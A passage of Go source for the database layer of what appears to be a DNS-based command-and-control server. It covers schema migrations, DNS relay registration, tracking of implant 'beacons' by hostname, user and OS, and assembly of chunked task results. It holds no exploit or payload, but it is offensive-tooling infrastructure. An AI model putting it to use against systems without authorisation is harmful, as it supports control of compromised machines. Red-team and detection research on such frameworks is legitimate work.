		delivered_at INTEGER,
		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE,
		FOREIGN KEY (client_binary_id) REFERENCES client_binaries(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_pending_caches_dns_server ON pending_stager_caches(dns_server_id);
	CREATE INDEX IF NOT EXISTS idx_pending_caches_delivered ON pending_stager_caches(delivered);

	-- Sessions table (JWT session tracking)
	CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY,
		operator_id TEXT NOT NULL,
		token_hash TEXT NOT NULL,
		created_at INTEGER NOT NULL,
		expires_at INTEGER NOT NULL,
		last_activity INTEGER NOT NULL,
		ip_address TEXT,
		user_agent TEXT,
		is_revoked INTEGER DEFAULT 0,
		FOREIGN KEY (operator_id) REFERENCES operators(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_sessions_operator ON sessions(operator_id);
	CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);
	CREATE INDEX IF NOT EXISTS idx_sessions_token_hash ON sessions(token_hash);
	`

	_, err := d.db.Exec(schema)
	return err
}

// migration2AddChunkUniqueConstraint adds UNIQUE constraint to task_results
// This prevents duplicate chunks from multiple DNS servers (Shadow Mesh deduplication)
func (d *MasterDatabase) migration2AddChunkUniqueConstraint() error {
	fmt.Println("[Master DB] Migration 2: Adding UNIQUE constraint to task_results (task_id, chunk_index)")

	// SQLite doesn't support ALTER TABLE ADD CONSTRAINT
	// We need to recreate the table with the new constraint

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Step 1: Create new table with UNIQUE constraint
	_, err = tx.Exec(`
		CREATE TABLE IF NOT EXISTS task_results_new (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			task_id TEXT NOT NULL,
			beacon_id TEXT NOT NULL,
			dns_server_id TEXT NOT NULL,
			result_data TEXT NOT NULL,
			received_at INTEGER NOT NULL,
			chunk_index INTEGER DEFAULT 0,
			total_chunks INTEGER DEFAULT 1,
			is_complete INTEGER DEFAULT 1,
			FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE,
			FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
			UNIQUE(task_id, chunk_index)
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create new table: %w", err)
	}

	// Step 2: Copy data from old table, keeping only one chunk per (task_id, chunk_index)
	// Use GROUP BY to deduplicate - keeps the row with max(id) for each unique (task_id, chunk_index)
	_, err = tx.Exec(`
		INSERT INTO task_results_new (id, task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
		SELECT id, task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete
		FROM task_results
		WHERE id IN (
			SELECT MAX(id)
			FROM task_results
			GROUP BY task_id, chunk_index
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to copy data: %w", err)
	}

	// Step 3: Drop old table
	_, err = tx.Exec(`DROP TABLE task_results`)
	if err != nil {
		return fmt.Errorf("failed to drop old table: %w", err)
	}

	// Step 4: Rename new table
	_, err = tx.Exec(`ALTER TABLE task_results_new RENAME TO task_results`)
	if err != nil {
		return fmt.Errorf("failed to rename table: %w", err)
	}

	// Step 5: Recreate indexes
	_, err = tx.Exec(`
		CREATE INDEX IF NOT EXISTS idx_task_results_task_id ON task_results(task_id);
		CREATE INDEX IF NOT EXISTS idx_task_results_beacon_id ON task_results(beacon_id);
		CREATE INDEX IF NOT EXISTS idx_task_results_dns_server ON task_results(dns_server_id);
		CREATE INDEX IF NOT EXISTS idx_task_results_received_at ON task_results(received_at);
	`)
	if err != nil {
		return fmt.Errorf("failed to recreate indexes: %w", err)
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("failed to commit transaction: %w", err)
	}

	fmt.Println("[Master DB] Migration 2 complete: UNIQUE constraint added, duplicates removed")
	return nil
}

// migration3AddTasksUpdatedAt adds updated_at column to tasks table for Shadow Mesh status sync
func (d *MasterDatabase) migration3AddTasksUpdatedAt() error {
	fmt.Println("[Master DB] Migration 3: Adding updated_at column to tasks table")

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Check if column already exists
	var hasColumn bool
	err = tx.QueryRow(`SELECT COUNT(*) FROM pragma_table_info('tasks') WHERE name='updated_at'`).Scan(&hasColumn)
	if err != nil {
		return fmt.Errorf("failed to check if column exists: %w", err)
	}

	if hasColumn {
		fmt.Println("[Master DB] Migration 3: updated_at column already exists, skipping")
		return tx.Commit()
	}

	// Add the column with a default value (use created_at as initial value)
	_, err = tx.Exec(`ALTER TABLE tasks ADD COLUMN updated_at INTEGER NOT NULL DEFAULT 0`)
	if err != nil {
		return fmt.Errorf("failed to add updated_at column: %w", err)
	}

	// Set updated_at to created_at for existing rows
	_, err = tx.Exec(`UPDATE tasks SET updated_at = created_at WHERE updated_at = 0`)
	if err != nil {
		return fmt.Errorf("failed to initialize updated_at values: %w", err)
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("failed to commit transaction: %w", err)
	}

	fmt.Println("[Master DB] Migration 3 complete: updated_at column added to tasks table")
	return nil
}

// migration4AddSessionJTI adds jti (JWT ID) column to sessions table for token revocation
func (d *MasterDatabase) migration4AddSessionJTI() error {
	fmt.Println("[Master DB] Migration 4: Adding jti column to sessions table")

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Check if column already exists
	var hasColumn bool
	err = tx.QueryRow(`SELECT COUNT(*) FROM pragma_table_info('sessions') WHERE name='jti'`).Scan(&hasColumn)
	if err != nil {
		return fmt.Errorf("failed to check if column exists: %w", err)
	}

	if hasColumn {
		fmt.Println("[Master DB] Migration 4: jti column already exists, skipping")
		return tx.Commit()
	}

	// Add the jti column (JWT ID for token revocation)
	// SQLite doesn't support adding a UNIQUE column directly, so we add it as nullable first
	_, err = tx.Exec(`ALTER TABLE sessions ADD COLUMN jti TEXT`)
	if err != nil {
		return fmt.Errorf("failed to add jti column: %w", err)
	}

	// Create unique index for the jti column
	_, err = tx.Exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_sessions_jti ON sessions(jti) WHERE jti IS NOT NULL`)
	if err != nil {
		return fmt.Errorf("failed to create unique jti index: %w", err)
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("failed to commit transaction: %w", err)
	}

	fmt.Println("[Master DB] Migration 4 complete: jti column added to sessions table")
	return nil
}

// migration5AddBinaryChecksum adds sha256_checksum column to client_binaries table
func (d *MasterDatabase) migration5AddBinaryChecksum() error {
	fmt.Println("[Master DB] Migration 5: Adding sha256_checksum column to client_binaries table")

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Check if column already exists
	var hasColumn bool
	err = tx.QueryRow(`SELECT COUNT(*) FROM pragma_table_info('client_binaries') WHERE name='sha256_checksum'`).Scan(&hasColumn)
	if err != nil {
		return fmt.Errorf("failed to check if column exists: %w", err)
	}

	if hasColumn {
		fmt.Println("[Master DB] Migration 5: sha256_checksum column already exists, skipping")
		return tx.Commit()
	}

	// Add the sha256_checksum column (hex-encoded SHA256 hash of original binary)
	_, err = tx.Exec(`ALTER TABLE client_binaries ADD COLUMN sha256_checksum TEXT`)
	if err != nil {
		return fmt.Errorf("failed to add sha256_checksum column: %w", err)
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("failed to commit transaction: %w", err)
	}

	fmt.Println("[Master DB] Migration 5 complete: sha256_checksum column added to client_binaries table")
	return nil
}

// migration6RemoveBeaconsFKConstraint removes foreign key constraint from beacons.dns_server_id
// This prevents beacon registration failures when DNS server hasn't registered yet
// The dns_server_id field becomes metadata only, similar to task_results table
func (d *MasterDatabase) migration6RemoveBeaconsFKConstraint() error {
	fmt.Println("[Master DB] Migration 6: Removing FK constraint from beacons.dns_server_id")

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("failed to begin transaction: %w", err)
	}
	defer tx.Rollback()

	// Create new beacons table without FK constraint
	_, err = tx.Exec(`
		CREATE TABLE IF NOT EXISTS beacons_new (
			id TEXT PRIMARY KEY,
			hostname TEXT NOT NULL,
			username TEXT NOT NULL,
			os TEXT NOT NULL,
			arch TEXT NOT NULL,
			ip_address TEXT,
			dns_server_id TEXT NOT NULL,
			first_seen INTEGER NOT NULL,
			last_seen INTEGER NOT NULL,
			status TEXT DEFAULT 'active',
			metadata TEXT,
			created_at INTEGER NOT NULL,
			updated_at INTEGER NOT NULL
		)
	`)
	if err != nil {
		return fmt.Errorf("failed to create new beacons table: %w", err)
	}

	// Copy all data from old table
	_, err = tx.Exec(`
		INSERT INTO beacons_new (id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen, status, metadata, created_at, updated_at)
		SELECT id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen, status, metadata, created_at, updated_at
		FROM beacons
	`)
	if err != nil {
		return fmt.Errorf("failed to copy beacon data: %w", err)
	}

	// Drop old table
	_, err = tx.Exec(`DROP TABLE beacons`)
	if err != nil {
		return fmt.Errorf("failed to drop old beacons table: %w", err)
	}

	// Rename new table
	_, err = tx.Exec(`ALTER TABLE beacons_new RENAME TO beacons`)
	if err != nil {
		return fmt.Errorf("failed to rename table: %w", err)
	}

	// Recreate indexes
	_, err = tx.Exec(`
		CREATE INDEX IF NOT EXISTS idx_beacons_dns_server ON beacons(dns_server_id);
		CREATE INDEX IF NOT EXISTS idx_beacons_last_seen ON beacons(last_seen);
		CREATE INDEX IF NOT EXISTS idx_beacons_status ON beacons(status);
		CREATE INDEX IF NOT EXISTS idx_beacons_hostname ON beacons(hostname);
	`)
	if err != nil {
		return fmt.Errorf("failed to recreate indexes: %w", err)
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("failed to commit transaction: %w", err)
	}

	fmt.Println("[Master DB] Migration 6 complete: beacons.dns_server_id FK constraint removed")
	return nil
}

// DNS Server operations

// RegisterDNSServer registers a new DNS server or updates existing one
func (d *MasterDatabase) RegisterDNSServer(id, domain, address, apiKey string) error {

	// Hash API key for storage
	apiKeyHash, err := bcrypt.GenerateFromPassword([]byte(apiKey), bcrypt.DefaultCost)
	if err != nil {
		return fmt.Errorf("failed to hash API key: %w", err)
	}

	now := time.Now().Unix()

	// Check if server already exists by ID (same server restarting)
	var existingDomain string
	err = d.db.QueryRow(`SELECT domain FROM dns_servers WHERE id = ?`, id).Scan(&existingDomain)

	if err == sql.ErrNoRows {
		// New DNS server - insert it
		// Note: Set last_checkin to 0 initially so first checkin can be detected
		_, err = d.db.Exec(`
			INSERT INTO dns_servers (id, domain, address, api_key_hash, status, first_seen, last_checkin, created_at, updated_at)
			VALUES (?, ?, ?, ?, 'active', ?, 0, ?, ?)
		`, id, domain, address, string(apiKeyHash), now, now, now)

		if err != nil {
			// Check if it's a domain conflict
			if strings.Contains(err.Error(), "UNIQUE constraint failed: dns_servers.domain") {
				// Domain already exists with different ID - this shouldn't happen in normal operation
				// but could occur if DNS server was rebuilt with new ID
				// Update the existing record with the new ID
				_, err = d.db.Exec(`
					UPDATE dns_servers 
					SET id = ?, address = ?, api_key_hash = ?, updated_at = ?
					WHERE domain = ?
				`, id, address, string(apiKeyHash), now, domain)
			}
		}

		return err
	} else if err != nil {
		return fmt.Errorf("failed to check existing server: %w", err)
	}

	// Server exists - update it (e.g., server restart with same ID)
	_, err = d.db.Exec(`
		UPDATE dns_servers 
		SET domain = ?, address = ?, api_key_hash = ?, updated_at = ?
		WHERE id = ?
	`, domain, address, string(apiKeyHash), now, id)

	return err
}

// VerifyDNSServerAPIKey verifies a DNS server's API key
func (d *MasterDatabase) VerifyDNSServerAPIKey(dnsServerID, apiKey string) (bool, error) {

	var apiKeyHash string
	err := d.db.QueryRow(`
		SELECT api_key_hash FROM dns_servers WHERE id = ? AND status = 'active'
	`, dnsServerID).Scan(&apiKeyHash)

	if err != nil {
		if err == sql.ErrNoRows {
			return false, nil // DNS server not found or inactive
		}
		return false, err
	}

	// Compare hashed API key
	err = bcrypt.CompareHashAndPassword([]byte(apiKeyHash), []byte(apiKey))
	return err == nil, nil
}

// UpdateDNSServerCheckin updates last check-in time for a DNS server
func (d *MasterDatabase) UpdateDNSServerCheckin(dnsServerID string) (bool, error) {

	// Check if this is the first checkin (last_checkin was 0)
	var lastCheckin int64
	err := d.db.QueryRow(`SELECT last_checkin FROM dns_servers WHERE id = ?`, dnsServerID).Scan(&lastCheckin)
	if err != nil {
		return false, err
	}

	isFirstCheckin := (lastCheckin == 0)

	// Update checkin time
	_, err = d.db.Exec(`
		UPDATE dns_servers SET last_checkin = ?, updated_at = ?, status = 'active' WHERE id = ?
	`, time.Now().Unix(), time.Now().Unix(), dnsServerID)

	return isFirstCheckin, err
}

// GetDNSServers retrieves all DNS servers
func (d *MasterDatabase) GetDNSServers() ([]DNSServer, error) {

	rows, err := d.db.Query(`
		SELECT id, domain, address, status, first_seen, last_checkin, beacon_count, task_count
		FROM dns_servers
		ORDER BY domain ASC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var servers []DNSServer
	for rows.Next() {
		var id, domain, address, status string
		var firstSeen, lastCheckin int64
		var beaconCount, taskCount int

		err := rows.Scan(&id, &domain, &address, &status, &firstSeen, &lastCheckin, &beaconCount, &taskCount)
		if err != nil {
			return nil, err
		}

		servers = append(servers, DNSServer{
			ID:          id,
			Domain:      domain,
			Address:     address,
			Status:      status,
			FirstSeen:   time.Unix(firstSeen, 0).Format(time.RFC3339),
			LastCheckin:  time.Unix(lastCheckin, 0).Format(time.RFC3339),
			BeaconCount: beaconCount,
			TaskCount:   taskCount,
		})
	}

	return servers, rows.Err()
}

// GetActiveDNSServers retrieves only active DNS servers
func (d *MasterDatabase) GetActiveDNSServers() ([]DNSServer, error) {

	rows, err := d.db.Query(`
		SELECT id, domain, address, status, first_seen, last_checkin, beacon_count, task_count
		FROM dns_servers
		WHERE status = 'active'
		ORDER BY domain ASC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var servers []DNSServer
	for rows.Next() {
		var id, domain, address, status string
		var firstSeen, lastCheckin int64
		var beaconCount, taskCount int

		err := rows.Scan(&id, &domain, &address, &status, &firstSeen, &lastCheckin, &beaconCount, &taskCount)
		if err != nil {
			return nil, err
		}

		servers = append(servers, DNSServer{
			ID:          id,
			Domain:      domain,
			Address:     address,
			Status:      status,
			FirstSeen:   time.Unix(firstSeen, 0).Format(time.RFC3339),
			LastCheckin:  time.Unix(lastCheckin, 0).Format(time.RFC3339),
			BeaconCount: beaconCount,
			TaskCount:   taskCount,
		})
	}

	return servers, rows.Err()
}

// Beacon operations

// UpsertBeacon inserts or updates a beacon (from DNS server reports).
// Empty strings for hostname/username/os/arch are preserved via COALESCE
// so that staged registration can send fields across multiple queries.
func (d *MasterDatabase) UpsertBeacon(beaconID, hostname, username, os, arch, ipAddress, dnsServerID string, firstSeen, lastSeen time.Time, beaconName, payloadFormat, encoding, buildID string, registrationStage *int) error {

	firstSeenUnix := firstSeen.Unix()
	lastSeenUnix := lastSeen.Unix()
	now := time.Now().Unix()

	_, err := d.db.Exec(`
		INSERT INTO beacons (id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen, status, created_at, updated_at, beacon_name, payload_format, encoding, build_id, registration_stage)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'active', ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			hostname = COALESCE(NULLIF(excluded.hostname, ''), beacons.hostname),
			username = COALESCE(NULLIF(excluded.username, ''), beacons.username),
			os = COALESCE(NULLIF(excluded.os, ''), beacons.os),
			arch = COALESCE(NULLIF(excluded.arch, ''), beacons.arch),
			ip_address = excluded.ip_address,
			dns_server_id = excluded.dns_server_id,
			last_seen = excluded.last_seen,
			status = 'active',
			updated_at = excluded.updated_at,
			beacon_name = COALESCE(NULLIF(excluded.beacon_name, ''), beacons.beacon_name),
			payload_format = COALESCE(NULLIF(excluded.payload_format, ''), beacons.payload_format),
			encoding = COALESCE(NULLIF(excluded.encoding, ''), beacons.encoding),
			build_id = COALESCE(NULLIF(excluded.build_id, ''), beacons.build_id),
			registration_stage = excluded.registration_stage
	`, beaconID, hostname, username, os, arch, ipAddress, dnsServerID, firstSeenUnix, lastSeenUnix, now, now, beaconName, payloadFormat, encoding, buildID, registrationStage)

	return err
}

// RecordBeaconDNSContact tracks that a beacon contacted a specific DNS server
// This is called whenever a beacon checks in to a DNS server
func (d *MasterDatabase) RecordBeaconDNSContact(beaconID, dnsServerID, dnsDomain string) error {

	now := time.Now().Unix()

	// Upsert the contact record
	_, err := d.db.Exec(`
		INSERT INTO beacon_dns_contacts (beacon_id, dns_server_id, dns_domain, first_contact, last_contact, contact_count)
		VALUES (?, ?, ?, ?, ?, 1)
		ON CONFLICT(beacon_id, dns_server_id) DO UPDATE SET
			last_contact = excluded.last_contact,
			contact_count = contact_count + 1
	`, beaconID, dnsServerID, dnsDomain, now, now)
	if err != nil {
		return err
	}

	// Ensure beacon_domains has this domain so the UI shows it.
	// INSERT OR IGNORE preserves user's active toggle on existing rows.
	if dnsDomain != "" {
		_, err = d.db.Exec(`
			INSERT OR IGNORE INTO beacon_domains (beacon_id, domain, active, added_at)
			VALUES (?, ?, 1, ?)
		`, beaconID, dnsDomain, now)
	}

	return err
}

// GetBeaconDNSContacts retrieves all DNS servers a beacon has contacted
func (d *MasterDatabase) GetBeaconDNSContacts(beaconID string) ([]DNSContact, error) {

	// Updated query to determine status based on last_contact time (active if contacted within last 30 minutes)
	query := `
		SELECT
			bdc.dns_server_id,
			bdc.dns_domain,
			bdc.first_contact,
			bdc.last_contact,
			bdc.contact_count,
			CASE
				WHEN bdc.last_contact >= ? THEN 'active'
				ELSE 'inactive'
			END as dns_status
		FROM beacon_dns_contacts bdc
		WHERE bdc.beacon_id = ?
		ORDER BY bdc.last_contact DESC
	`

	// Calculate threshold for active status (30 minutes ago)
	activeThreshold := time.Now().Add(-30 * time.Minute).Unix()

	rows, err := d.db.Query(query, activeThreshold, beaconID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var contacts []DNSContact
	for rows.Next() {
		var dnsServerID, dnsDomain, dnsStatus sql.NullString
		var firstContact, lastContact, contactCount int64

		err := rows.Scan(&dnsServerID, &dnsDomain, &firstContact, &lastContact, &contactCount, &dnsStatus)
		if err != nil {
			return nil, err
		}

		contacts = append(contacts, DNSContact{
			DNSServerID:  dnsServerID.String,
			DNSDomain:    dnsDomain.String,
			FirstContact: time.Unix(firstContact, 0).Format(time.RFC3339),
			LastContact:  time.Unix(lastContact, 0).Format(time.RFC3339),
			ContactCount: contactCount,
			DNSStatus:    dnsStatus.String,
		})
	}

	return contacts, nil
}

// GetDNSServerBeacons retrieves all beacons that have contacted a specific DNS server
func (d *MasterDatabase) GetDNSServerBeacons(dnsServerID string, minutesThreshold int) ([]DNSServerBeacon, error) {

	threshold := time.Now().Add(-time.Duration(minutesThreshold) * time.Minute).Unix()

	query := `
		SELECT
			bdc.beacon_id,
			b.hostname,
			b.username,
			b.os,
			bdc.last_contact,
			bdc.contact_count
		FROM beacon_dns_contacts bdc
		JOIN beacons b ON bdc.beacon_id = b.id
		WHERE bdc.dns_server_id = ? AND bdc.last_contact >= ?
		ORDER BY bdc.last_contact DESC
	`

	rows, err := d.db.Query(query, dnsServerID, threshold)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var beacons []DNSServerBeacon
	for rows.Next() {
		var beaconID, hostname, username, os string
		var lastContact, contactCount int64

		err := rows.Scan(&beaconID, &hostname, &username, &os, &lastContact, &contactCount)
		if err != nil {
			return nil, err
		}

		_ = username    // scanned but not in struct
		_ = os          // scanned but not in struct
		_ = contactCount // scanned but not in struct

		beacons = append(beacons, DNSServerBeacon{
			BeaconID: beaconID,
			Hostname: hostname,
			LastSeen: time.Unix(lastContact, 0).Format(time.RFC3339),
		})
	}

	return beacons, nil
}

// GetAllBeaconDNSConnections returns all beacon-to-DNS-server connections for the infrastructure map.
func (d *MasterDatabase) GetAllBeaconDNSConnections() ([]BeaconDNSConnection, error) {

	rows, err := d.db.Query(`
		SELECT DISTINCT beacon_id, dns_server_id
		FROM beacon_dns_contacts
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var connections []BeaconDNSConnection
	for rows.Next() {
		var beaconID, dnsServerID string
		if err := rows.Scan(&beaconID, &dnsServerID); err != nil {
			continue
		}
		connections = append(connections, BeaconDNSConnection{
			BeaconID:    beaconID,
			DNSServerID: dnsServerID,
		})
	}
	return connections, nil
}

// GetActiveBeacons retrieves beacons active within the last N minutes
func (d *MasterDatabase) GetActiveBeacons(minutesThreshold int) ([]Beacon, error) {
	return d.GetActiveBeaconsPaginated(minutesThreshold, 0, 0)
}

// GetActiveBeaconsPaginated retrieves active beacons with pagination support
func (d *MasterDatabase) GetActiveBeaconsPaginated(minutesThreshold, limit, offset int) ([]Beacon, error) {

	threshold := time.Now().Add(-time.Duration(minutesThreshold) * time.Minute).Unix()

	query := `
		SELECT id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen, status,
			COALESCE(beacon_name, '') as beacon_name,
			COALESCE(payload_format, '') as payload_format,
			COALESCE(encoding, '') as encoding,
			COALESCE(build_id, '') as build_id
		FROM beacons
		WHERE last_seen >= ? AND status = 'active'
		ORDER BY last_seen DESC
	`

	if limit > 0 {
		query += fmt.Sprintf(" LIMIT %d", limit)
	}
	if offset > 0 {
		query += fmt.Sprintf(" OFFSET %d", offset)
	}

	rows, err := d.db.Query(query, threshold)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var beacons []Beacon
	for rows.Next() {
		var id, hostname, username, os, arch, ipAddress, dnsServerID, status, beaconName, payloadFormat, encoding, buildID string
		var firstSeen, lastSeen int64

		err := rows.Scan(&id, &hostname, &username, &os, &arch, &ipAddress, &dnsServerID, &firstSeen, &lastSeen, &status, &beaconName, &payloadFormat, &encoding, &buildID)
		if err != nil {
			return nil, err
		}

		beacons = append(beacons, Beacon{
			ID:            id,
			Hostname:      hostname,
			Username:      username,
			OS:            os,
			Arch:          arch,
			IPAddress:     ipAddress,
			DNSServerID:   dnsServerID,
			FirstSeen:     time.Unix(firstSeen, 0).Format(time.RFC3339),
			LastSeen:      time.Unix(lastSeen, 0).Format(time.RFC3339),
			Status:        status,
			BeaconName:    beaconName,
			PayloadFormat: payloadFormat,
			Encoding:      encoding,
			BuildID:       buildID,
		})
	}

	return beacons, rows.Err()
}

// GetAllBeaconsPaginated retrieves all beacons with pagination support (no time filter)
// This preserves history - beacons are shown regardless of when they last checked in
func (d *MasterDatabase) GetAllBeaconsPaginated(limit, offset int) ([]Beacon, error) {

	query := `
		SELECT id, hostname, username, os, arch, ip_address, dns_server_id, first_seen, last_seen, status,
			COALESCE(beacon_name, '') as beacon_name,
			COALESCE(payload_format, '') as payload_format,
			COALESCE(encoding, '') as encoding,
			COALESCE(build_id, '') as build_id,
			registration_stage
		FROM beacons
		ORDER BY last_seen DESC
	`

	if limit > 0 {
		query += fmt.Sprintf(" LIMIT %d", limit)
	}
	if offset > 0 {
		query += fmt.Sprintf(" OFFSET %d", offset)
	}

	rows, err := d.db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var beacons []Beacon
	for rows.Next() {
		var id, hostname, username, os, arch, ipAddress, dnsServerID, status, beaconName, payloadFormat, encoding, buildID string
		var firstSeen, lastSeen int64
		var regStage *int

		err := rows.Scan(&id, &hostname, &username, &os, &arch, &ipAddress, &dnsServerID, &firstSeen, &lastSeen, &status, &beaconName, &payloadFormat, &encoding, &buildID, &regStage)
		if err != nil {
			return nil, err
		}

		beacons = append(beacons, Beacon{
			ID:                id,
			Hostname:          hostname,
			Username:          username,
			OS:                os,
			Arch:              arch,
			IPAddress:         ipAddress,
			DNSServerID:       dnsServerID,
			FirstSeen:         time.Unix(firstSeen, 0).Format(time.RFC3339),
			LastSeen:          time.Unix(lastSeen, 0).Format(time.RFC3339),
			Status:            status,
			BeaconName:        beaconName,
			PayloadFormat:     payloadFormat,
			Encoding:          encoding,
			BuildID:           buildID,
			RegistrationStage: regStage,
		})
	}

	return beacons, rows.Err()
}

// CountAllBeacons returns the total count of all beacons (no time filter)
func (d *MasterDatabase) CountAllBeacons() (int, error) {

	var count int
	err := d.db.QueryRow("SELECT COUNT(*) FROM beacons").Scan(&count)
	return count, err
}

// GetBeacon retrieves details for a specific beacon by ID
func (d *MasterDatabase) GetBeacon(beaconID string) (Beacon, error) {

	var id, hostname, username, os, arch, ipAddress, dnsServerID, status string
	var beaconName, payloadFormat, encoding, buildID string
	var firstSeen, lastSeen int64
	var regStage *int

	err := d.db.QueryRow(`
		SELECT id, hostname, username, os, arch, ip_address, dns_server_id,
		       first_seen, last_seen, status,
		       COALESCE(beacon_name, ''), COALESCE(payload_format, ''), COALESCE(encoding, ''),
		       COALESCE(build_id, ''), registration_stage
		FROM beacons
		WHERE id = ?
	`, beaconID).Scan(&id, &hostname, &username, &os, &arch, &ipAddress, &dnsServerID,
		&firstSeen, &lastSeen, &status,
		&beaconName, &payloadFormat, &encoding, &buildID, &regStage)

	if err == sql.ErrNoRows {
		return Beacon{}, nil
	}
	if err != nil {
		return Beacon{}, err
	}

	return Beacon{
		ID:                id,
		Hostname:          hostname,
		Username:          username,
		OS:                os,
		Arch:              arch,
		IPAddress:         ipAddress,
		DNSServerID:       dnsServerID,
		FirstSeen:         time.Unix(firstSeen, 0).Format(time.RFC3339),
		LastSeen:          time.Unix(lastSeen, 0).Format(time.RFC3339),
		Status:            status,
		BeaconName:        beaconName,
		PayloadFormat:     payloadFormat,
		Encoding:          encoding,
		BuildID:           buildID,
		RegistrationStage: regStage,
	}, nil
}

// Task Result operations

// SaveResultChunk stores a result chunk from a DNS server
// Handles multi-server chunked results by aggregating all chunks
// Uses fine-grained locking to avoid blocking other DNS servers
func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, chunkIndex, totalChunks int, data string) error {

	now := time.Now().Unix()

	// Note: dns_server_id FK constraint removed from task_results table
	// This allows result storage even if DNS server not yet registered
	// DNS server will be registered on first check-in or can be added manually

	// Log chunk receipt for debugging premature completion issues
	if !strings.HasPrefix(taskID, "D") {
		if totalChunks == 1 {
			dbLog("SaveResultChunk - SINGLE CHUNK: taskID=%s, chunkIndex=%d, totalChunks=%d, dataLen=%d\n",
				taskID, chunkIndex, totalChunks, len(data))
		} else {
			dbLog("SaveResultChunk - MULTI CHUNK: taskID=%s, chunkIndex=%d, totalChunks=%d, dataLen=%d\n",
				taskID, chunkIndex, totalChunks, len(data))
		}
	}

	// SHADOW MESH: Handle metadata-only notifications (chunk_index=0 with empty data)
	// DNS servers send this to hint at totalChunks. We need to store this for progress tracking.
	if chunkIndex == 0 && len(data) == 0 {
		if totalChunks > 0 {
			// Store the expected totalChunks in task metadata for progress tracking
			_, err := d.db.Exec(`
				UPDATE tasks 
				SET chunk_count = CASE WHEN chunk_count IS NULL OR chunk_count = 0 THEN ? ELSE chunk_count END,
				    updated_at = ?
				WHERE id = ?
			`, totalChunks, now, taskID)
			if err != nil {
				dbLogAlways("Failed to update task %s chunk_count: %v\n", taskID, err)
			} else {
				dbLog("Recorded expected totalChunks=%d for task %s from metadata notification\n", totalChunks, taskID)
			}
		}
		return nil
	}

	var err error

	// Determine if this is a complete result
	isComplete := 0
	// Single-chunk results: chunkIndex=1, totalChunks=1 (1-indexed from DNS servers)
	// Assembled results: chunkIndex=0, totalChunks>1 (0-indexed for assembled data)
	if chunkIndex == 1 && totalChunks == 1 {
		// Single-chunk result from DNS server (1-indexed)
		isComplete = 1
	} else if chunkIndex == 0 && len(data) > 0 {
		// Assembled result (totalChunks>1) or legacy 0-indexed single chunk
		// ONLY mark complete if there's actual data
		isComplete = 1

		// If this is an assembled result from a DNS server, store it and we're done
		if totalChunks > 1 {
			// This is a DNS server sending us the complete assembled result
			// Check if we already have it
			var existingID int
			err = d.db.QueryRow(`
				SELECT id FROM task_results 
				WHERE task_id = ? AND chunk_index = 0 AND total_chunks = ? AND is_complete = 1
				LIMIT 1
			`, taskID, totalChunks).Scan(&existingID)

			if err == sql.ErrNoRows {
				// Store the complete result
				_, err = d.db.Exec(`
					INSERT OR REPLACE INTO task_results (task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
					VALUES (?, ?, ?, ?, ?, 0, ?, 1)
				`, taskID, beaconID, dnsServerID, data, now, totalChunks)

				if err == nil {
					dbLog("Received complete assembled result from %s: task %s, %d chunks, %d bytes (waiting for RESULT_COMPLETE)\n",
						dnsServerID, taskID, totalChunks, len(data))
					// Update task metadata - result is in task_results table
					_, updateErr := d.db.Exec(`
						UPDATE tasks SET result_size = ?, chunk_count = ?, updated_at = ? WHERE id = ?
					`, len(data), totalChunks, now, taskID)
					if updateErr != nil {
						dbLogAlways("Error updating task metadata: %v\n", updateErr)
					}
				} else {
					dbLogAlways("Error saving assembled result: %v\n", err)
				}
				return err
			}
			// Already have complete result, skip duplicate
			return nil
		}
	}

	// SHADOW MESH: If totalChunks is 0 but we have chunk data, lookup expected chunk_count from task metadata
	// This handles the case where metadata notification arrived before data chunk
	if totalChunks == 0 && len(data) > 0 && chunkIndex >= 1 {
		var expectedTotal int
		err := d.db.QueryRow("SELECT COALESCE(chunk_count, 0) FROM tasks WHERE id = ?", taskID).Scan(&expectedTotal)
		if err == nil && expectedTotal > 0 {
